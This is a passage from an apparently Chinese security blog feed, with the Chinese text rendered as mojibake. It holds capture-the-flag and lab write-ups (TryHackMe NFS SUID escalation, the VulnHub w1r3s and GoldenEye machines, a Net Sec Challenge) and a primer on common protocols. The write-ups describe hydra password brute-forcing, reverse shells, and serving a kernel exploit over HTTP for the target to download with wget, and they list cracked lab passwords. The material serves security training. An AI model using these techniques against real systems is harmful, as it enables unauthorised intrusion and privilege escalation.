class="headerlink" title="1.æšä¸¾ç›®æ ‡æœºå™¨ä¸Šçš„å¯æŒ‚è½½å…±äº«ã€‚"></a>1.æšä¸¾ç›®æ ‡æœºå™¨ä¸Šçš„å¯æŒ‚è½½å…±äº«ã€‚</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051637138.png" alt="image-20240805163709080"></p><h3 id="2-æŠŠå…¶ä¸­ä¸€ä¸ªâ€œno-root-squashâ€å…±äº«å®‰è£…åˆ°æˆ‘ä»¬çš„æ”»å‡»æœºå™¨ä¸Šå¹¶å¼€å§‹æ„å»ºæˆ‘ä»¬çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚"><a href="#2-æŠŠå…¶ä¸­ä¸€ä¸ªâ€œno-root-squashâ€å…±äº«å®‰è£…åˆ°æˆ‘ä»¬çš„æ”»å‡»æœºå™¨ä¸Šå¹¶å¼€å§‹æ„å»ºæˆ‘ä»¬çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚" class="headerlink" title="2.æŠŠå…¶ä¸­ä¸€ä¸ªâ€œno_root_squashâ€å…±äº«å®‰è£…åˆ°æˆ‘ä»¬çš„æ”»å‡»æœºå™¨ä¸Šå¹¶å¼€å§‹æ„å»ºæˆ‘ä»¬çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚"></a>2.æŠŠå…¶ä¸­ä¸€ä¸ªâ€œno_root_squashâ€å…±äº«å®‰è£…åˆ°æˆ‘ä»¬çš„æ”»å‡»æœºå™¨ä¸Šå¹¶å¼€å§‹æ„å»ºæˆ‘ä»¬çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051641457.png" alt="image-20240805164116393"></p><h3 id="3-æ„é€ å…·æœ‰suidä½çš„å¯æ‰§è¡Œæ–‡ä»¶"><a href="#3-æ„é€ å…·æœ‰suidä½çš„å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="3.æ„é€ å…·æœ‰suidä½çš„å¯æ‰§è¡Œæ–‡ä»¶"></a>3.æ„é€ å…·æœ‰suidä½çš„å¯æ‰§è¡Œæ–‡ä»¶</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051644339.png" alt="image-20240805164434274"></p><p>ç„¶ååœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå…·æœ‰suidä½çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>w1r3s</title>
    <link href="/2024/07/18/w1r3s/"/>
    <url>/2024/07/18/w1r3s/</url>
    
    <content type="html"><![CDATA[<h1 id="w1r3s"><a href="#w1r3s" class="headerlink" title="w1r3s"></a>w1r3s</h1><h2 id="ä¿¡æ¯æ”¶é›†åŠ ææƒ"><a href="#ä¿¡æ¯æ”¶é›†åŠ ææƒ" class="headerlink" title="ä¿¡æ¯æ”¶é›†åŠ ææƒ"></a>ä¿¡æ¯æ”¶é›†åŠ ææƒ</h2><p>åœ¨åŒä¸€å­ç½‘ä¸­ï¼Œåˆ©ç”¨arp-scan -l è¿›è¡Œå­˜æ´»ä¸»æœºçš„æ¢æµ‹ã€‚</p><p>ç„¶ååˆ©ç”¨nmapè¿›è¡Œç«¯å£çš„æ‰«æã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407180951487.png" alt="image-20240718095053343"></p><p>è¿™ä¸ªé¶æœºæ˜¯ä¸€ä¸ªunubtuçš„ï¼Œç„¶åç”¨æˆ·åæˆ‘ä»¬æ˜¯çŸ¥é“çš„ï¼Œå»åˆ©ç”¨hydraçˆ†ç ´ftpå’Œsshçš„å¯†ç ï¼Œæœ€ç»ˆå¯ä»¥å¾—åˆ°sshçš„å¯†ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407181008796.png" alt="image-20240718100851694"></p><p>å…¶å®åˆ°è¿™ä¸€æ­¥è·ç¦»ææƒå°±å¾ˆå¿«äº†ï¼Œsshçš„å¯†ç ä¹Ÿæ˜¯é‚£å°æœºå™¨çš„å¯†ç ã€‚ç„¶åå°±å»çœ‹ä¸€ä¸‹å¦‚ä½•ææƒã€‚</p><p>å…ˆ<code>sudo -l</code>çœ‹ä¸€ä¸‹å†…å®¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407181058858.png" alt="image-20240718105825780"></p><p>æ˜¯ALLçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨<code>sudo su</code>è¿›è¡Œææƒã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407181059342.png" alt="image-20240718105913287"></p>]]></content>
    
    
    <categories>
      
      <category>é¶æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Net Sec Challenge</title>
    <link href="/2024/07/17/Net%20Sec%20Challenge/"/>
    <url>/2024/07/17/Net%20Sec%20Challenge/</url>
    
    <content type="html"><![CDATA[<h1 id="Net-Sec-Challenge"><a href="#Net-Sec-Challenge" class="headerlink" title="Net Sec Challenge"></a>Net Sec Challenge</h1><p>ä½¿ç”¨nmapå¯¹1-10000çš„ç«¯å£è¿›è¡Œä¸€ä¸ªæ‰«æ</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nmap</span> -sV -<span class="hljs-built_in">p1</span>-<span class="hljs-number">10000</span> -T4 <span class="hljs-built_in">ip</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171536534.png" alt="image-20240717153652326"></p><p>å¯ä»¥çœ‹åˆ°sshæœåŠ¡å™¨æ ‡å¤´éšè—çš„ä¿¡æ¯ï¼Œä»¥åŠåœ¨10000ä»¥å†…å¼€æ”¾çš„ç«¯å£çš„è¯¦ç»†ä¿¡æ¯ã€‚</p><p>ä½¿ç”¨telnetå¯¹httpè¿›è¡Œä¸€ä¸ªè¿œç¨‹è¿æ¥</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171538759.png" alt="image-20240717153818631"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-armasm"><span class="hljs-symbol">host:</span><span class="hljs-built_in">ip</span></span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°HTTPæœåŠ¡å™¨æ ‡å¤´ä¸­éšè—çš„ä¿¡æ¯ã€‚</p><p>é€šè¿‡æ‰«æ10000-15000çš„ç«¯å£ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªç«¯å£ä¸º10021çš„ftpæœåŠ¡ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171605168.png" alt="image-20240717160514047"> </p><p>ç„¶åçŸ¥é“æœ‰ä¸¤ä¸ªç”¨æˆ·å eddieå’Œquinn</p><p>é€šè¿‡hydraè¿›è¡Œä¸€ä¸ªçˆ†ç ´</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171625724.png" alt="image-20240717162515580"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171625875.png" alt="image-20240717162530822"></p><p>å¯ä»¥å¾—åˆ°è´¦æˆ·å¯†ç ã€‚</p><p>ç„¶åå»ftpç™»å½•ä¸€ä¸‹ï¼Œåœ¨quinnç”¨æˆ·ä¸‹å‘ç°flag</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171642901.png" alt="image-20240717164243817"></p><p>ç»•è¿‡IDSæ—¶ï¼Œä½¿ç”¨nmap -sN ipè¿›è¡Œæ‰«æ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171726464.png" alt="image-20240717172656357"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171727746.png" alt="image-20240717172707595"></p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GoldenEye</title>
    <link href="/2024/07/16/GoldenEye/"/>
    <url>/2024/07/16/GoldenEye/</url>
    
    <content type="html"><![CDATA[<h1 id="GoldenEye"><a href="#GoldenEye" class="headerlink" title="GoldenEye"></a>GoldenEye</h1><h2 id="ä¿¡æ¯æ”¶é›†ï¼š"><a href="#ä¿¡æ¯æ”¶é›†ï¼š" class="headerlink" title="ä¿¡æ¯æ”¶é›†ï¼š"></a>ä¿¡æ¯æ”¶é›†ï¼š</h2><p>1.ç”±äºé¶æœºå’Œkaliåœ¨åŒä¸€ç½‘æ®µä¸­ï¼Œå¯ä»¥ä½¿ç”¨arp-scanè¿›è¡Œå­˜æ´»ä¸»æœºçš„æ‰«æã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161523604.png" alt="image-20240716152330426"></p><p>å¯ä»¥æŸ¥è¯¢åˆ°ç›®æ ‡ipçš„åœ°å€ã€‚</p><p>å»è®¿é—®ä¸€ä¸‹ï¼š</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161524135.png" alt="image-20240716152441074"></p><p>æœ‰ä¸€ä¸ªç™»å½•çš„è·¯ç”±ï¼Œä½†ä¸çŸ¥é“è´¦å·å¯†ç ï¼Œå¯ä»¥å¯¹ç«¯å£å’Œç›®å½•å…ˆè¿›è¡Œä¸€ä¸ªä¿¡æ¯çš„æ”¶é›†ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161531316.png" alt="image-20240716153117183"></p><p>å¯ä»¥çœ‹åˆ°å¼€å¯äº†å››ä¸ªç«¯å£ï¼Œå…¶ä¸­ä¸€ä¸ªhttpæœåŠ¡ï¼Œå’Œsmtp(é‚®ä»¶ä¼ è¾“åè®®) pop3(é‚®å±€åè®®)ï¼Œéƒ½æ˜¯ä»¥æ˜æ–‡çš„å½¢å¼è¿›è¡Œä¼ è¾“ï¼Œå¯èƒ½ä¼šè·Ÿè´¦æˆ·å¯†ç æœ‰å…³è”ã€‚ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161535894.png" alt="image-20240716153529798"></p><p>æ‰«ç›®å½•å°±æ‰«åˆ°äº†ä¸€ä¸ªjsæ–‡ä»¶ï¼Œè®¿é—®å»çœ‹ä¸€ä¸‹ã€‚æŸ¥çœ‹ç½‘é¡µæºä»£ç ä¹Ÿèƒ½è¿›è¡Œçœ‹åˆ°ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161540058.png" alt="image-20240716154014964"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161606962.png" alt="image-20240716160651853"></p><p>å¯ä»¥å¾—åˆ°ä¸¤ä¸ªç”¨æˆ·åå’Œä¸€ä¸ªå¯†ç  Boris Natalya å¯†ç ç»è¿‡htmlè§£ç ä¹‹åæ˜¯ï¼šInvincibleHack3r</p><p>ç„¶åç”¨telnetè¿›è¡Œpop3çš„ç™»å½• ä½†æ— æœï¼Œç™»å½•åå°ä¹Ÿä¸è¡Œï¼Œé‚£å°±æ˜¯å¯†ç ä¸å¯¹äº†ï¼Œå¯¹å¯†ç è¿›è¡Œçˆ†ç ´ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161655463.png" alt="image-20240716165515399"></p><p>Borisçš„å¯†ç æ˜¯secret1! </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161700951.png" alt="image-20240716170003801"></p><p>Natalyaçš„å¯†ç æ˜¯bird</p><p>ç„¶åçˆ†ç ´å‡ºæ¥å¯†ç ä¹‹åè¿›è¡Œä¸€ä¸ªpop3çš„telnetè¿æ¥ã€‚</p><p>åœ¨Borisçš„ç”µå­é‚®ç®±ä¸­å‘ç°ä¸‰ä¸ªç”µå­é‚®ä»¶ï¼Œåœ¨NataLyaçš„ç”µå­é‚®ç®±ä¸­å‘ç°2ä¸ªç”µå­é‚®ä»¶ã€‚</p><p>åœ¨ç”µå­é‚®ä»¶ä¸­å¯ä»¥å¾—çŸ¥è´¦æˆ·å¯†ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161706817.png" alt="image-20240716170601693"></p><p>æ³¨æ„ä¸‹é¢çš„ä¿¡æ¯ï¼Œæ·»åŠ severnaya-station.comåˆ°hostæ–‡ä»¶ä¸­ï¼Œlinuxçš„å°±åœ¨/etc/hostsä¸­æ·»åŠ ä¸€ä¸‹å¯¹åº”çš„ipå’Œç½‘å€å³å¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161716184.png" alt="image-20240716171656092"></p><p>ç„¶åå»è®¿é—®<a href="http://severnaya-station.com/gnocertdir">http://severnaya-station.com/gnocertdir</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161717951.png" alt="image-20240716171732761"></p><p>å¯ä»¥è¿›è¡Œä¸€ä¸ªç™»å½•ï¼Œç”¨æˆ·åå’Œå¯†ç è¯•è¯•ä¹‹å‰é‚®ç®±å¾—åˆ°çš„ã€‚ç™»å½•æˆåŠŸã€‚</p><p>è¿›å…¥åå°ä¹‹åä»ç„¶å¯¹ä¿¡æ¯è¿›è¡Œä¸€ä¸ªæ”¶é›†ï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆç‰ˆæœ¬çš„ï¼Œæœ‰æ²¡æœ‰æ•æ„Ÿä¿¡æ¯çš„æ³„éœ²ã€‚</p><p>å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªé‚®ä»¶ï¼Œç”¨æˆ·åæ˜¯Doak</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161738349.png" alt="image-20240716173802270"></p><p>å¯¹å¯†ç è¿›è¡Œä¸€ä¸‹çˆ†ç ´ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161742544.png" alt="image-20240716174246433"></p><p>å¾—åˆ°äº†å¯†ç ï¼Œåˆ©ç”¨telnetè¿›è¡Œç™»å½•ã€‚</p><p>å¾—åˆ°è´¦æˆ·å¯†ç <img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161745639.png" alt="image-20240716174501588"></p><p>ç„¶åé€€å‡ºxeniaçš„è´¦å·ï¼Œç”¨doakçš„è´¦æˆ·è¿›è¡Œä¸€ä¸ªç™»å½•ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161749855.png" alt="image-20240716174948782"></p><p>åœ¨è¿™ä¸ªåœ°æ–¹æœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œé‡Œé¢æ˜¯ä¸€äº›ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161751104.png" alt="image-20240716175136985"></p><p>è®©æˆ‘ä»¬å»è®¿é—®ä¸€å¼ å›¾ç‰‡ï¼Œè·¯å¾„ç»™äº†ï¼ŒæŠŠå®ƒä¸‹è½½ä¸‹æ¥ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161753194.png" alt="image-20240716175341119"></p><p>åœ¨å›¾ç‰‡æè¿°é‡Œé¢å‘ç°ä¸€ä¸ªç»è¿‡base64ç¼–ç çš„ä¿¡æ¯ï¼Œè§£ç çœ‹çœ‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161754214.png" alt="image-20240716175430127"></p><p>åº”è¯¥æ˜¯æŸä¸ªç”¨æˆ·çš„å¯†ç ã€‚</p><p>å…ˆæŠŠdoakç”¨æˆ·ç»™é€€å‡ºï¼Œç„¶åadminç™»å½•è¯•è¯•çœ‹ï¼Œç»“æœæ˜¯å¯ä»¥çš„ã€‚</p><h2 id="è·å–shell"><a href="#è·å–shell" class="headerlink" title="è·å–shell"></a>è·å–shell</h2><p>ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥åˆ©ç”¨msfæœç´¢ç›¸å…³çš„æ¼æ´åˆ©ç”¨ï¼Œç„¶åè®¾ç½®ä¸€äº›ä¿¡æ¯ï¼Œæœ€årunå³å¯ã€‚</p><p>å¦ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯åˆ©ç”¨pythonåå¼¹ä¸€ä¸ªshellã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161932694.png" alt="image-20240716193201473"></p><p>åœ¨ä¸Šé¢é‚£ä¸ªåœ°æ–¹è¿›è¡Œä¸€ä¸ªåå¼¹shell.  åå¼¹shellå‘½ä»¤ï¼š <a href="https://www.revshells.com/">https://www.revshells.com/</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161932978.png" alt="image-20240716193227924"></p><p>æœ€åå»ç‚¹è¿™é‡Œ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161934624.png" alt="image-20240716193434530"></p><p>è®©åå¼¹shellçš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æ ¹æ®å‰é¢æ‰“é¶æœºçš„ç»éªŒï¼Œæ—¢ç„¶æ˜¯unubtuçš„ç³»ç»Ÿï¼Œé‚£å°±çœ‹çœ‹æ˜¯å¦å­˜åœ¨å†…æ ¸ææƒæ¼æ´ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161948413.png" alt="image-20240716194806343"></p><p>å»æœç´¢ä¸€ä¸‹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161952971.png" alt="image-20240716195256797"></p><p>å­˜åœ¨è¿™ä¸ªå†…æ ¸æ¼æ´ï¼Œé‚£å°±åˆ©ç”¨ä¸€ä¸‹ã€‚</p><p>åœ¨æœ¬åœ°å¼€ä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œ <code>python3 -m http.server 8080</code> </p><p>æŠŠæ–‡ä»¶æ”¾åˆ°ä½ å¼€å¯æœåŠ¡çš„ç›®å½•ä¸‹é¢å»ï¼Œç„¶ååœ¨é¶æœºä¸Šé¢åˆ©ç”¨wgetè¿›è¡Œä¸‹è½½ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407162014416.png" alt="image-20240716201443300"></p><p>ä½†gccè¿™ä¸ªç¯å¢ƒå¹¶æ²¡æœ‰ å¯ä»¥æŠŠgccæ”¹æˆcc</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407162024891.png" alt="image-20240716202448748"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407162027528.png" alt="image-20240716202739328"></p>]]></content>
    
    
    <categories>
      
      <category>é¶æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åè®®å’ŒæœåŠ¡å™¨</title>
    <link href="/2024/07/13/%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2024/07/13/%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="åè®®å’ŒæœåŠ¡å™¨"><a href="#åè®®å’ŒæœåŠ¡å™¨" class="headerlink" title="åè®®å’ŒæœåŠ¡å™¨"></a>åè®®å’ŒæœåŠ¡å™¨</h1><p>ä¸»è¦ä»‹ç»äº†ä¸€äº›å¸¸ç”¨çš„åè®®ã€‚</p><h2 id="HTTP-è¶…æ–‡æœ¬ä¼ è¾“åè®®"><a href="#HTTP-è¶…æ–‡æœ¬ä¼ è¾“åè®®" class="headerlink" title="HTTP(è¶…æ–‡æœ¬ä¼ è¾“åè®®)"></a>HTTP(è¶…æ–‡æœ¬ä¼ è¾“åè®®)</h2><p>æ˜¯ç”¨äºä¼ è¾“ç½‘ç»œçš„åè®®ï¼Œç½‘ç»œæµè§ˆå™¨è¿æ¥åˆ°ç½‘ç»œæœåŠ¡å™¨å¹¶ä½¿ç”¨HTTPè¯·æ±‚ HTML é¡µé¢å’Œå›¾åƒä»¥åŠå…¶ä»–æ–‡ä»¶ï¼Œæäº¤è¡¨å•å¹¶ä¸Šä¼ å„ç§æ–‡ä»¶ã€‚</p><p>ä¸‹é¢æ˜¯thmçš„ä¸€ä¸ªå›¾åƒè§£é‡Šï¼š<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a23a13cef49ae7fff87bfd94f6a175dc.png" alt="img"></p><p>httpä»¥æ˜æ–‡çš„å½¢å¼å‘é€æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨telnetæ¥å……å½“webæµè§ˆå™¨ï¼Œå‘webæœåŠ¡å™¨å‘é€æ•°æ®ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407131011443.png" alt="image-20240713101118210"></p><h2 id="FTP-æ–‡ä»¶ä¼ è¾“åè®®"><a href="#FTP-æ–‡ä»¶ä¼ è¾“åè®®" class="headerlink" title="FTP(æ–‡ä»¶ä¼ è¾“åè®®)"></a>FTP(æ–‡ä»¶ä¼ è¾“åè®®)</h2><p>ftpä¸»è¦ç”¨äºä¸åŒç³»ç»Ÿä¸åŒè®¡ç®—æœºä¹‹é—´è¿›è¡Œæ–‡ä»¶çš„ä¼ è¾“ã€‚ftpé»˜è®¤ç›‘å¬<strong>21ç«¯å£</strong>ï¼Œä½¿ç”¨æ˜æ–‡è¿›è¡Œæ•°æ®çš„ä¼ è¾“ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥ä½¿ç”¨telnetæ¥ä»£æ›¿ftpå®¢æˆ·ç«¯ å’ŒftpæœåŠ¡ç«¯è¿›è¡Œä¸€ä¸ªæ•°æ®çš„é€šä¿¡ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407131028189.png" alt="image-20240713102854955"></p><p>SYSTæ˜¯æŸ¥çœ‹ç›®æ ‡çš„ç³»ç»Ÿç±»å‹ã€‚</p><p>FTPçš„PASVæœ‰ä¸¤ç§æ¨¡å¼ï¼š</p><ul><li>ä¸»åŠ¨ï¼šåœ¨ä¸»åŠ¨æ¨¡å¼ä¸‹ï¼Œæ•°æ®é€šè¿‡æºè‡ªFTPæœåŠ¡å™¨ç«¯å£ 20 çš„å•ç‹¬é€šé“å‘é€ã€‚</li><li>è¢«åŠ¨ï¼šåœ¨è¢«åŠ¨æ¨¡å¼ä¸‹ï¼Œæ•°æ®é€šè¿‡æ¥è‡ªFTPå®¢æˆ·ç«¯ç«¯å£å· 1023 ä»¥ä¸Šçš„å•ç‹¬é€šé“å‘é€ã€‚</li></ul><p>TYPE Aæ˜¯å°†æ–‡ä»¶ä¼ è¾“æ¨¡å¼è½¬æˆASCIIã€‚TYPE Iæ˜¯å°†æ–‡ä»¶ä¼ è¾“æ¨¡å¼è½¬æˆäºŒè¿›åˆ¶ã€‚</p><p>æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ç®€å•çš„å®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚telnetï¼‰æ¥ä¼ è¾“æ–‡ä»¶ï¼Œå› ä¸ºftpä¼šä¸ºæ–‡ä»¶ä¼ è¾“åˆ›å»ºå•ç‹¬çš„è¿æ¥ã€‚</p><p>FTPæœåŠ¡å™¨è½¯ä»¶çš„ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li><a href="https://security.appspot.com/vsftpd.html">vsftpd</a></li><li><a href="http://www.proftpd.org/">FTPDè½¯ä»¶</a></li><li><a href="https://www.uftpserver.com/">FTPæœåŠ¡å™¨</a></li></ul><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407131049171.png" alt="image-20240713104903106"></p><p>get filenameä¸‹è½½æ–‡ä»¶</p><h2 id="POP3-é‚®å±€åè®®3"><a href="#POP3-é‚®å±€åè®®3" class="headerlink" title="POP3(é‚®å±€åè®®3)"></a>POP3(é‚®å±€åè®®3)</h2><p>é‚®å±€åè®®ç‰ˆæœ¬ 3 (POP3) æ˜¯ä¸€ç§ç”¨äºä»é‚®ä»¶æŠ•é€’ä»£ç† ( MDA ) æœåŠ¡å™¨ä¸‹è½½ç”µå­é‚®ä»¶æ¶ˆæ¯çš„åè®®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚é‚®ä»¶å®¢æˆ·ç«¯è¿æ¥åˆ°POP3æœåŠ¡å™¨ï¼Œè¿›è¡Œèº«ä»½éªŒè¯ï¼Œä¸‹è½½æ–°ç”µå­é‚®ä»¶æ¶ˆæ¯ï¼Œç„¶åï¼ˆå¯é€‰ï¼‰åˆ é™¤å®ƒä»¬ã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ed910ad418376edc846846fc2a0dd3f6.png" alt="img"></p><p>é»˜è®¤ç›‘å¬ç«¯å£æ˜¯<strong>110</strong></p><p>pop3éœ€è¦è¿›è¡Œèº«ä»½çš„éªŒè¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407131133906.png" alt="image-20240713113341847"></p><p>ä½¿ç”¨STATæˆ‘ä»¬å¾—åˆ°å“åº” <code>+OK nn mm</code> nnä»£è¡¨æ”¶ä»¶ç®±ä¸­çš„ç”µå­é‚®ä»¶æ•°é‡ mmä»£è¡¨æ”¶ä»¶ç®±çš„å¤§å°ï¼ˆä»¥å…«å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚</p><p><code>LIST</code>æä¾›äº†æœåŠ¡å™¨ä¸Šçš„æ–°æ¶ˆæ¯åˆ—è¡¨ï¼Œå¹¶<code>RETR 1</code>æ£€ç´¢åˆ—è¡¨ä¸­çš„ç¬¬ä¸€æ¡æ¶ˆæ¯ã€‚</p><h2 id="SMTP-ç®€å•é‚®ä»¶ä¼ è¾“åè®®"><a href="#SMTP-ç®€å•é‚®ä»¶ä¼ è¾“åè®®" class="headerlink" title="SMTP(ç®€å•é‚®ä»¶ä¼ è¾“åè®®)"></a>SMTP(ç®€å•é‚®ä»¶ä¼ è¾“åè®®)</h2><p>é€šè¿‡äº’è”ç½‘ä¼ é€’ç”µå­é‚®ä»¶éœ€è¦ä»¥ä¸‹ç»„ä»¶ï¼š</p><ol><li>é‚®ä»¶æäº¤ä»£ç† (MSA)</li><li>é‚®ä»¶ä¼ è¾“ä»£ç†ï¼ˆMTAï¼‰</li><li>é‚®ä»¶æŠ•é€’ä»£ç† ( MDA )</li><li>é‚®ä»¶ç”¨æˆ·ä»£ç† ( MUA )</li></ol><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/822a449fd569c16c875a13ca2487b714.png" alt="img"></p><p>æµç¨‹ç”¨thmé€šä¿—çš„è¯è¯­æ¥è§£é‡Šä¸€ä¸‹ï¼š</p><ol><li>æ‚¨ï¼ˆMUAï¼‰æƒ³è¦å‘é€é‚®ä»¶ã€‚</li><li>åœ¨æ‚¨å½“åœ°çš„é‚®å±€ ( MTA ) æ¥å—é‚®ä»¶ä¹‹å‰ï¼Œé‚®å±€å‘˜å·¥ (MSA) ä¼šæ£€æŸ¥é‚®ä»¶æ˜¯å¦å­˜åœ¨ä»»ä½•é—®é¢˜ã€‚</li><li>å½“åœ°é‚®å±€æ£€æŸ¥é‚®ä»¶ç›®çš„åœ°å¹¶å°†å…¶å‘é€åˆ°æ­£ç¡®å›½å®¶çš„é‚®å±€ï¼ˆMTA ï¼‰ã€‚</li><li>é‚®å±€ï¼ˆMTAï¼‰å°†é‚®ä»¶æŠ•é€’åˆ°æ”¶ä»¶äººé‚®ç®±ï¼ˆMDAï¼‰ã€‚</li><li>æ”¶ä»¶äººï¼ˆMUAï¼‰ä¼šå®šæœŸæ£€æŸ¥é‚®ç®±æ˜¯å¦æœ‰æ–°é‚®ä»¶ã€‚ä»–ä»¬ä¼šæ³¨æ„åˆ°æ–°é‚®ä»¶ï¼Œå¹¶æ¥æ”¶å®ƒã€‚</li></ol><p>ç®€å•ä¼ 